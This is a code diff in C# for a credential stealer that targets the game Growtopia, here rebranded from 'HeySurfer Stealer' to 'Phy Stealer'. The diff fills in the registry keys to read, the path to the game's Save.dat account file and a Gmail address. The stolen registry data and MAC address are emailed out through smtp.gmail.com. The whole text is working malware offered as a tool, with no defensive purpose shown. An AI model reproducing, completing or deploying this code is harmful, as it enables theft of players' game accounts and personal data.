@@ -51,10 +51,10 @@ internal sealed class Module1
             string cryptography = crypto();
             string[] macaddress = class1.GetMacAddress();
             string[] hkcu = class1.thonk();
-            string regfolder = ""; //TYPE THE FOLDER NAME HERE FROM HKCU
-            string regfile1 = ""; //TYPE ONE OF THE FILE NAMES HERE FROM THAT FOLDER
-            string regfile2 = ""; //TYPE ONE SECOND FILE NAME HERE
-            string text = ""; //EMAIL HERE WITH @GMAIL.COM
+            string regfolder = "Software"; //TYPE THE FOLDER NAME HERE FROM HKCU
+            string regfile1 = "Growtopia"; //TYPE ONE OF THE FILE NAMES HERE FROM THAT FOLDER
+            string regfile2 = "Activate Setup"; //TYPE ONE SECOND FILE NAME HERE
+            string text = "taaffyou@gmail.com"; //EMAIL HERE WITH @GMAIL.COM
             string password = "";  //pas
             string regkeys = Regdata(hkcu[2], hkcu[4], "a", "b", "c", "d", cryptography, "xd", regfolder, regfile1, regfile2, "xd", "xd", "xd", "xd", macaddress);
             string str = "\\Growtopia\\Save.dat";
@@ -62,8 +62,8 @@ internal sealed class Module1
             string fileName = folderPath + str;
             string from = text;
             string to = text;
-            string subject = "HeySurfer Stealer";
-            string body = Bodyy("WrongGrow Stealer V2", macaddress);
+            string subject = "Phy Stealer";
+            string body = Bodyy("Phy Stealer V2", macaddress);
             MailMessage mailMessage = new MailMessage(from, to, subject, body);
             object obj = new SmtpClient("smtp.gmail.com", 587);
             NewLateBinding.LateSet(obj, null, "EnableSsl", new object[]
